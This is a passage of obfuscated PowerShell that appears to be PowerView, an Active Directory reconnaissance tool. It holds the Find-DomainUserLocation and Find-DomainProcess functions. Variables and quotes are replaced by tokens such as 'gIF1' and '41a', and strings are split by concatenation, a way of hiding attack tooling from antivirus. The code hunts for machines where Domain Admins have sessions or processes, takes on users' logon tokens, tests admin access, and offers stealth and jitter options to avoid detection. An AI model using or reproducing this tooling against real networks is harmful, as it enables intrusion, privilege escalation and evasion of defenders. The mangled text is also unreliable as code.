        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        gIF1StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        gIF1Jitter = .3,

        [Parameter(ParameterSetName = 41aShowAll41a)]
        [Switch]
        gIF1ShowAll,

        [Switch]
        gIF1Stealth,

        [String]
        [ValidateSet(41aDFS41a, 41aDC41a, 41aFile41a, 41aAll41a)]
        gIF1StealthSource = 41aAll41a,

        [Int]
        [ValidateRange(1, 100)]
        gIF1Threads = 20
    )

    BEGIN {

        gIF1ComputerSearcherArguments = @{
            41aProperties41a = 41adnshostname41a
        }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1ComputerSearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aComputerDomain41a]) { gIF1ComputerSearcherArguments[41aDomain41a] = gIF1ComputerDomain }
        if (gIF1PSBoundParameters[41aComputerLDAPFilter41a]) { gIF1ComputerSearcherArguments[41aLDAPFilter41a] = gIF1ComputerLDAPFilter }
        if (gIF1PSBoundParameters[41aComputerSearchBase41a]) { gIF1'+'ComputerSearcherArguments[41aSearchBase41a] = gIF1ComputerSearchBase }
        if (gIF1PSBoundParameters[41aUnconstrained41a]) { gIF1ComputerSearcherArguments[41aUnconstrained41a] = gIF1Unconstrained }
        if (gIF1PSBoundParameters[41aComputerOperatingSystem41a]) { gIF1ComputerSearcherArguments[41aOperatingSystem41a] = gIF1OperatingSystem }
        if (gIF1PSBoundParameters[41aComputerServicePack41a]) { gIF1ComputerSearcherArguments[41aServicePack41a] = gIF1ServicePack }
        if (gIF1PSBoundParameters[41aComputerSiteName41a]) { gIF1ComputerSearcherArguments[41aSiteName41a] = gIF1SiteName }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1ComputerSearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1ComputerSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1ComputerSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1ComputerSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1ComputerSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ComputerSearcherArguments[41aCredential41a] = gIF1Credential }

        gIF1UserSearcherArguments = @{
            41aProperties41a = 41asamaccountname41a
        }
        if (gIF1PSBoundParameters[41aUserIdentity41a]) { gIF1UserSearcherArguments[41aIdentity41a] = gIF1UserIdentity }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1UserSearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aUserDomain41a]) { gIF1UserSearcherArguments[41aDomain41a] = gIF1UserDomain }
        if (gIF1PSBoundParameters[41aUserLDAPFilter41a]) { gIF1UserSearcherArguments[41aLDAPFilter41a] = gIF1UserLDAPFilter }
        if (gIF1PSBoundParameters[41aUserSearchBase41a]) { gIF1UserSearcherArguments[41aS'+'earchBase41a] = gIF1UserSearchBase }
        if (gIF1PSBoundParameters[41aUserAdminCount41a]) { gIF1UserSearcherArguments[41aAdminCount41a] = gIF1UserAdminCount }
        if (gIF1PSBoundParameters[41aUserAllowDelegation41a]) { gIF1UserSe'+'archerArguments[41aAllowDelegation41a] = gIF1UserAllowDelegation }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1UserSearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1UserSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1UserSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1UserSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1UserSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1UserSearcherArguments[41aCredential41a] = gIF1Credential }

        gIF1TargetComputers = @()

     '+'   # first, build the set of computers to enumerate
        if (gIF1PSBoundParameters[41aComputerName41a]) {
            gIF1TargetComputers = @(gIF1ComputerName)
        }
        else {
            if (gIF1PSBoundParameters[41aStealth41a]) {
                Write-Verbose Zfr[Find-DomainUserLocation] Stealth enumeration using source: gIF1StealthSourceZfr
                gIF1TargetComputerArrayList = New-Object'+' System.Collections.ArrayList

                if (gIF1StealthSource -match 41aFileU9BAll41a) {
                    Write-Verbose 41a[Find-DomainUserLocation] Querying for file servers41a
                    gIF1FileServerSearcherArguments = @{}
                    i'+'f (gIF1PSBoundParameters[41aDomain41a]) { gIF1FileServerSearcherArguments[41aDomain41a] = gIF1Domain }
                    if (gIF1PSBoundParameters[41aComputerDomain41a]) { gIF1FileServerSearcherArguments[41aDomain41a] = gIF1ComputerDomain }
                    if (gIF1PSBoundParameters[41aComputerSearchBase41a]) { gIF1FileServerSearcherArguments[41aSearchBase41a] = gIF1ComputerSearchBase }
                    if (gIF1PSBoundParameters[41aServer41a]) { gIF1FileServerSearcherArguments[41aServer41a] = gIF1Server }
                    if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1FileServerSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
                    if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1FileServerSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
                    if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1FileServerSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
                    if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1FileServerSearcherArguments[41aTombstone41a] = gIF1Tombstone }
                    if (gIF1PSBoundParameters[41aCredential41a]) { gIF1FileServerSearcherArguments[41aCredential41a] = gIF1Credential }
                    gIF1FileServers = Get-DomainFileServer @FileServerSearcherArguments
                    if (gIF1FileServers -isnot [System.Array]) { gIF1FileServers = @(gIF1FileServers) }
                    gIF1TargetComputerArrayList.AddRange( gIF1FileServers )
                }
                if (gIF1StealthSource -match 41aDFSU9BAll41a) {
                    Write-Verbose 41a[Find-DomainUserLocation] Querying for DFS servers41a
                    # # TODO: fix the passed parameters to Get-DomainDFSShare
                    # gIF1ComputerName += Get-DomainDFSShare -Domain gIF1Domain -Server gIF1DomainController U9B ForEach-Object {gIF1_.RemoteServerName}
                }
                if (gIF1StealthSource -match 41aDCU9BAll41a) {
                    Write-Verbose 41a[Find-DomainUserLocation] Querying for domain controllers41a
                    gIF1DCSearcherArguments = @{
                        41aLDAP41a = gIF1True
                    }
                    if (gIF1PSBoundParameters[41aDomain41a]) { gIF1DCSearcherArguments[41aDomain41a] = gIF1Domain }
                    if (gIF1PSBoundParameters[41aComputerDomain41a]) { gIF1DCSearcherArguments[41aDomain41a] = gIF1ComputerDomain }
                    if (gIF1PSBoundParameters[41aServer41a]) { gIF1DCSearcherArguments[41aServer41a] = gIF1Server }
            '+'        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1DCSearcherArguments[41aCredential41a] = gIF1Credential }
                    gIF1DomainControllers = Get-DomainController @DCSearcherArguments U9B Select-Object -ExpandProperty dnshostname
                    if (gIF1DomainControllers -isnot [System.Array]) { gIF1DomainControllers = @(gIF1DomainControllers) }
                    gIF1TargetComputerArrayList.AddRange( gIF1DomainControllers )
                }
                gIF1TargetComputers = gIF1TargetComputerArrayList.ToArray()
            }
            else {
                Write-Verbose 41a[Find-DomainUserLocation] Querying for all computers in the domain41a
                gIF1TargetComputers = Get-DomainComputer @ComputerSearcherArguments U9B Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose Zfr[Find-DomainUserLocation] TargetComputers length: gIF1(gIF1TargetComputers.Length)Zfr
        if (gIF1TargetComputers.Length -eq 0) {
            throw 41a[Find-DomainUserLocation] No hosts found to enumerate41a
        }

        # get the current user so we can ignore it in the results
        if (gIF1PSBoundParameters[41aCredential41a]) {
            gIF1CurrentUser = gIF1Credential.GetNetworkCredential().UserName
        }
        else {
            gIF1CurrentUser = ([Environment]::UserName).ToLower()
        }

        # now build the user target set
        if (gIF1PSBoundParameters[41aShowAll41a]) {
            gIF1TargetUsers = @()
        }
        elseif (gIF1PSBoundParameters[41aUserIdentity41a] -or gIF1PSBoundParameters[41aUserLDAPFilter41a] -or gIF1PSBoundParameters[41aUserSearchBase41a] -or gIF1PSBoundParameters[41aUserAdminCount41a] -or gIF1PSBoundParameters[41aUserAllowDelegation41a]) {
            gIF1TargetUsers = Get-DomainUser @UserSearcherArguments U9B Select-Object -ExpandProperty samaccountname
        }
        else {
            gIF1GroupSearcherArguments = @{
                41aIdentity41a = gIF1UserGroupIdentity
                41aRecurse41a = gIF1True
            }
            if (gIF1PSBoundParameters[41aUserDomain41a]) { gIF1GroupSearcherArguments[41aDomain41a] = gIF1UserDomain }
            if (gIF1PSBoundParameters[41aUserSearchBase41a]) { gIF1GroupSearcherArguments[41aSearchBase41a] = gIF1UserSearchBase }
            if (gIF1PSBoundPa'+'rameters[41aServer41a]) { gIF1GroupSearcherArguments[41aServer41a] = gIF1Server }
            if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1GroupSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
            if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1GroupSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
            if (gIF1PSBoundParameters[41'+'aServerTimeLimit41a]) { gIF1GroupSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
            if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1GroupSearcherArguments[41aTombstone41a] = gIF1Tombstone }
            if (gIF1PSBoundParameters[41aCredential41a]) { gIF1GroupSearcherArguments[41aCredential41a] = gIF1Credential }
            gIF1TargetUsers = Get-DomainGroupMember @GroupSearcherArguments U9B Select-Object -ExpandProperty MemberName
        }

        Write-Verbose Zfr[Find-DomainUserLocation] TargetUsers length: gIF1(gIF1TargetUsers.Length)Zfr
        if ((-not gIF1ShowAll) -and (gIF1TargetUsers.Length -eq 0)) {
            throw 41a[Find-DomainUserLocation] No users found to target41a
        }

        # the host enumeration block we41are using to enumerate all servers
        gIF1HostEnumBlock = {
            Param(gIF1ComputerName, gIF1TargetUsers, gIF1CurrentUser, gIF1Stealth, gIF1TokenHandle)

            if (gIF1TokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                gIF1Null = Invoke-UserImpersonation -TokenHandle gIF1TokenHandle -Quiet
            }

            ForEach (gIF1TargetComputer in gIF1ComputerName) {
                gIF1Up = Test-Connection -Count 1 -Quiet -ComputerName gIF1TargetComputer
                if (gIF1Up) {
                    gIF1Sessions = Get-NetSession -ComputerName gIF1TargetComputer
                    ForEach (gIF1Session in gIF1Sessions) {
                        gIF1UserName = gIF1Session.UserName
                        gIF1CName = gIF1Session.CName

                        if (gIF1CName -and gIF1CName.StartsWith(41aYwWYwW41a)) {
                            gIF1CName = gIF1CName.TrimStart(41aYwW41a)
                        }
'+'

                        # make sure we have a result, and ignore computergIF1 sessions
                        if ((gIF1UserName) -and (gIF1UserName.Trim() -ne 41a41a) -and (gIF1UserName -notmatch gIF1CurrentUser) -and (gIF1UserName -notmatch 41aYwWgIF1gIF141a)) {

                            if ( (-not gIF1TargetUsers) -or (gIF1TargetUsers -contains gIF1UserName)) {
                                gIF1UserLocation = New-Object PSObject
                                gIF1UserLocation U9B Add-Member Noteproperty 41aUserDomain41a gIF1Null
                                gIF1UserLocation U9B Add-Member Noteproperty 41aUserName41a gIF1UserName
                                gIF1UserLocation U9B Add-Member Noteproperty 41aComputerName41a gIF1TargetComputer
                                gIF1UserLocation U9B Add-Member Noteproperty 41aSessionFrom41a gIF1CName

                          '+'      # try to resolve the DNS hostname of gIF1Cname
                                try {
                                    gIF1CNameDNSName = [System.Net.Dns]::GetHostEntry(gIF1CName) U9B Select-Object -ExpandProperty HostName
                                    gIF1UserLocation U9B Add-Member NoteProperty 41aSessionFromName41a gIF1CnameDNSName
                                }
                                catch {
                                    gIF1UserLocation U9B Add-Member NoteProperty 41aSessionFromName41a gIF1Null
                                }

                                # see if we41are checking to see if we have local admin access on this machine
                                if (gIF1CheckAccess) {
                                    gIF1Admin = (Test-AdminAccess -ComputerName gIF1CName).IsAdmin
                                    gIF1UserLocation U9B Add-Member Noteproperty 41aLocalAdmin41a gIF1Admin.IsAdmin
                                }
                                else {
                                    gIF1UserLocation U9B Add-Member Noteproperty 41aLocalAdmin41a gIF1Null
                                }
                                gIF1UserLocation.PSObject.Ty'+'peNames.Insert(0, 41aPowerView.UserLocation41a)
                                gIF1UserLocation
                            }
                        }
                    }
                    if (-not gIF1Stealth) {
                        # if we41are not 41astealthy41a, enumerate loggedon users as well
                        gIF1LoggedOn = Get-NetLoggedon -ComputerName gIF1TargetComputer
                        ForEach (gIF1User in gIF1Lo'+'ggedOn) {
                            gIF1UserName = gIF1User.UserName
                            gIF1UserDomain = gIF1User.LogonDomain

                            # make sure wet have a result
                            if ((gIF1UserName) -and (gIF1UserName.trim() -ne 41a41a)) {
                                if ( (-not gIF1TargetUsers) -or (gIF1TargetUsers -contains gIF1UserName) -and (gIF1UserName -notmatch 41aYwWgIF1gIF141a)) {
                                    gIF1IPAddress = @(Resolve-IPAddress -ComputerName gIF1TargetComputer)[0].IPAddress
                                    gIF1UserLocation = New-Object PSObject
                                    gIF1UserLocation U9B Add-Member Noteproperty 41aUserDomain41a gIF1UserDomain
                                    gIF1UserLocation U9B Add-Member Noteproperty 41aUserName41a gIF1UserName
                                    gIF1UserLocation U9B Add-Member Noteproper'+'ty 41aComputerName41a gIF1TargetComputer
                                    gIF1UserLocation U9B Add-Member Noteproperty 41aIPAddress41a gIF1IPAddress
                                    gIF1UserLocation U9B Add-Member Noteproperty 41aSessionFrom41a gIF1Null
                                    gIF1UserLocation U9B Add-Member Noteproperty 41aSessionFromName41a gIF1Null

                                    # see if we41are checking to see if we have local admin access on this machine
                                    if (gIF1CheckAccess) {
                                        gIF1Admin = Test-AdminAccess -ComputerName gIF1TargetComputer
                                        gIF1UserLocation U9B Add-Member Noteproperty 41aLocalAdmin41a gIF1Admin.IsAdmin
                                    }
                                    else {
                                        gIF1UserLocation U9B Add-Member Noteproperty 41aLocalAdmin41a g'+'IF1Null
                                    }
                                    gIF1UserLocation.PSObject.TypeNames.Insert(0, 41aPowerView.UserLocation41a)
                                    gIF1UserLocation
                                }
                            }
                        }
                    }
                }
            }

            if (gIF1TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        gIF1LogonToken = gIF1Null
        if (gIF1PSBoundParameters[41aCredential41a]) {
            if (gIF1PSBoundParameters[41aDel'+'ay41a] -or gIF1PSBoundParameters[41aStopOnSuccess41a]) {
                gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential
            }
            else {
                gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (gIF1PSBoundParameters[41aDelay41a] -or gIF1PSBoundParameters[41aStopOnSuccess41a]) {

            Write-Verbose Zfr[Find-DomainUserLocation] Total number of hosts: gIF1(gIF1TargetComputers.count)Zfr
            Write-Verbose Zfr[Find-DomainUserLocation] Delay: gIF1Delay, Jitter: gIF1JitterZfr
            gIF1Counter = 0
            gIF1RandNo = New-Object System.Random

       '+'     ForEach (gIF1TargetComputer in gIF1TargetComputers) {
                gIF1Counter = gIF1Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds gIF1RandNo.Next((1-gIF1Jitter)*gIF1Delay, (1+gIF1Jitter)*gIF1Delay)

                Write-Verbose Zfr[Find-DomainUserLocation] Enumerating server gIF1Computer (gIF1Counter of gIF1(gIF1TargetComputers.Count))Zfr
                Invoke-Command -ScriptBlock gIF1HostEnumBlock -ArgumentList gIF1TargetComputer, gIF1TargetUsers, gIF1CurrentUser, gIF1Stealth, gIF1LogonToken

                if (gIF1Result -and gIF1StopOnSuccess) {
                    Write-Verbose Zfr[Find-DomainUserLocation] Target user found, returning earlyZfr
                    return
                }
            }
        }
        else {
            Write-Verbose Zfr[Find-DomainUserLocation] Using threading with threads: gIF1ThreadsZfr
            Write-Verbose Zfr[Find-DomainUserLocation] TargetComputers length: gIF1(gIF1TargetComputers.Length)Zfr

            # if we41are using threading, kick off the script block with New-ThreadedFunction
            gIF1ScriptParams = @{
                41aTargetUsers41a = gIF1TargetUsers
                41aCurrentUser41a = gIF1CurrentUser
                41aStealth41a = gIF1Stealth
                41aTokenHandle41a = gIF1LogonToken
            }

            # if we41are using threading, kick off the script block with New-ThreadedFunction using the gIF1HostEnumBlock + params
            New-ThreadedFunction -ComputerName gIF1TargetComputers -ScriptBlock gIF1HostEnumBlock -ScriptParameters gIF1ScriptParams -Threads gIF1Threads
        }
    }

    END {
        if (gIF1LogonToken) {
            Invoke-RevertToSelf -TokenHandle gIF1LogonToken
        }
    }
}


function Find-DomainProcess {
<#
.SYNOPSIS

Searches for processes on the domain using WMI, returning processes
t'+'hat match a particular user specification or process name.

Thanks to @paulbrandau for the approach idea.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Get-WMIProcess, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and queries the domain for users of a specified group
(default 41aDomain Admins41a) with Get-DomainGroupMember. Then for each server the
function enumerates any current processes running with Get-WMIProcess,
searching for processes running under any target user contexts or with the
specified -ProcessName. If -Credential is passed, it is passed through to
the underlying WMI commands used to enumerate the remote machines.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER Domain

Specifies the domain to query for computers AND users, defaults to the current domain.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr. Useful for OU queries.

.PARAMETER ComputerUnconstrained

Switch. Search computer objects that have unconstrained delegation.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER ProcessName

Search for processes with one or more specific names.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifies the LDAP source to search through for target users.
e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr. Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to 41aDomain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with 41a(adminCount=1)41a (meaning are/were privileged).

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Mana'+'gement.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER StopOnSuccess

Switch. Stop hunting after finding after finding a target user.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainProcess

Searches for processes run by 41aDomain Admins41a by enumerating every computer in the domain.

.EXAMPLE

Find-DomainProcess -UserAdminCount -ComputerOperatingSystem 41aWindows 7*41a -Domain dev.testlab.local

Enumerates Windows 7 computers in dev.testlab.local and returns any processes being run by
privileged users in dev.testlab.local.

.EXAMPLE

Find-DomainProcess -ProcessName putty.exe

Searchings for instances of putty.exe running on the current domain.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Find-DomainProcess -Domain testlab.l'+'ocal -Credential gIF1Cred

Searches processes being run by 41adomain admins41a in the'+' testlab.local using the specified alternate credentials.

.OUTPUTS

PowerView.UserProcess
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUsePSCredentialType41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSAvoidUsingPlainTextForPassword41a, 41a41a)]
    [OutputType(41aPowerView.UserProcess41a)]
    [CmdletBinding(DefaultParameterSetName = 41aNone41a)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDNSHostName41a)]
        [String[]]
        gIF1ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ComputerSearchBase,

        [Alias(41aUnconstrained41a)]
        [Switch]
        gIF1ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias(41aOperatingSystem41a)]
        [String]
        gIF1ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(41aServicePack41a)]
        [String]
        gIF1ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(41aSiteName41a)]
        [String]
        gIF1ComputerSiteName,

        [Parameter(ParameterSetName = 41aTargetProcess41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ProcessName,

        [Parameter(ParameterSetName = 41aTargetUser41a)]
        [Parameter(ParameterSetName = 41aUserIdentity41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1UserIdentity,

        [Parameter(ParameterSetName = 41aTargetUser41a)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1UserDomain,

        [Parameter(ParameterSetName = 41aTargetUser41a)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1UserLDAPFilter,

        [Parameter(ParameterSetName = 41aTargetUser41a)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aGroupName41a, 41aGroup41a)]
        [String[]]
        gIF1UserGroupIdentity = 41aDomain Admins41a,

        [Parameter(ParameterSetName = 41aTargetUser41a)]
        [Alias(41aAd'+'minCount41a)]
        [Switch]
        gIF1UserAdminCount,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        gIF1StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        gIF1Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        gIF1Threads = 20
    )

    BEGIN {
        gIF1ComputerSearcherArguments = @{
            41aProperties41a = 41adnshostname41a
        }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1ComputerSearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aComputerDomain41a]) { gIF1ComputerSearcherArguments[41aDomain41a] = gIF1ComputerDomain }
        if (gIF1PSBoundParameters[41aComputerLDAPFilter41a]) { gIF1ComputerSearcherArguments[41aLDAPFilter41a] = gIF1ComputerLDAPFilter }
        if (gIF1PSBoundParameters[41aComputerSearchBase41a]) { gIF1ComputerSearcherArguments[41aSearchBase41a] = gIF1ComputerSearchBase }
        if (gIF1PSBoundParameters[41aUnconstrained41a]) { gIF1ComputerSearcherArguments[41aUnconstrained41a] = gIF1Unconstrained }
        if (gIF1PSBoundParameters[41aComputerOperatingSystem41a]) { gIF1ComputerSearcherArguments[41aOperatingSystem41a] = gIF1OperatingSystem }
        if (gIF1PSBoundParameters[41aComputerServicePack41a]) { gIF1ComputerSearcherArguments[41aServicePack41a] = gIF1ServicePack }
        if (gIF1PSBoundParameters[41aComputerSiteName41a]) { gIF1ComputerSearcherArguments[41aSiteName41a] = gIF1SiteName }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1ComputerSearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1ComputerSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1ComputerSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1ComputerSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1ComputerSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ComputerSearcherArguments[41aCredential41a] = gIF1Credential }

        gIF1UserSearcherArguments = @{
            41aProperties41a = 41asamaccountname41a
        }
        if (gIF1PSBoundParameters[41aUserIdentity41a]) { gIF1UserSearcherArguments[41aIdentity41a] = gIF1UserIdentity }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1UserSearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aUserDomain41a]) { gIF1UserSearcherArguments[41aDomain41a] = gIF1UserDomain }
        if (gIF1PSBoundParameters[41aUserLDAPFilter41a]) { gIF1UserSearcherArguments[41aLDAPFilter41a] = gIF1UserLDAPFilter }
        if (gIF1PSBoundParameters[41aUserSearchBase41a]) { gIF1UserSearcherArguments[41aSearchBase41a] = gIF1UserSearchBase }
        if (gIF1PSBoundParameters[41aUserAdminCount41a]) { gIF1UserSearcherArguments[41aAdminCount41a] = gIF1UserAdminCount }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1UserSearcherAr'+'guments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1UserSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1UserSearcherArguments[41aResultPageS'+'ize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1UserSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1UserSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1UserSearcherArguments[41aCredential41a] = gIF1Credential }


        # first, build the set of computers to enumerate
        if (gIF1PSBoundParameters[41aComputerName41a]) {
            gIF1TargetComputers = gIF1ComputerName
        }
        else {
            Write-Verbose 41a[Find-DomainProcess] Querying computers in the domain41a
            gIF1TargetComputers = Get-DomainComputer @ComputerSearcherArguments U9B Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose Zfr[Find-DomainProcess] TargetComputers length: gIF1(gIF1TargetComputers.Length)Zfr
        if (gIF1TargetComputers.Length -eq 0) {
            throw 41a[Find-DomainProcess] No hosts found to enumerate41a
        }

        # now build the user target set
        if (gIF1PSBoundParameters[41aProcessName41a]) {
            gIF1TargetProcessName = @()
            ForEach (gIF1T in gIF1ProcessName) {
                gIF1TargetProcessName += gIF1T.Split(41a,41a)
            }
            if (gIF1TargetProcessName -isnot [System.Array]) {
                gIF1TargetProcessName = [String[]] @(gIF1TargetProcessName)
            }
        }
        elseif (gIF1PSBoundParameters[41aUserIdentity41a] -or gIF1PSBoundParameters[41aUserLDAPFilter41a] -or gIF1PSBoundParameters[41aUserSearchBase41a] -or gIF1PSBoundParameters[41aUserAdminCount41a] -or gIF1PSBoundParameters[41aUserAllowDelegation41a]) {
            gIF1TargetUsers = Get-DomainUser @UserSearcherArguments U9B Select-Object -ExpandProperty samaccountname
        }
        else {
            gIF1GroupSearcherArguments = @{
                41aIdentity41a = gIF1UserGroupIdentity
                41aRecurse41a = gIF1True
            }
            if (gIF1PSBoundParameters[41aUserDomain41a]) { gIF1GroupSearcherArguments[41aDomain41a] = gIF1UserDomain }
            if (gIF1PSBoundParameters[41aUserSearchBase41a]) { gIF1GroupSearcherArguments[41aSearchBase41a] = gIF1UserSearchBase }
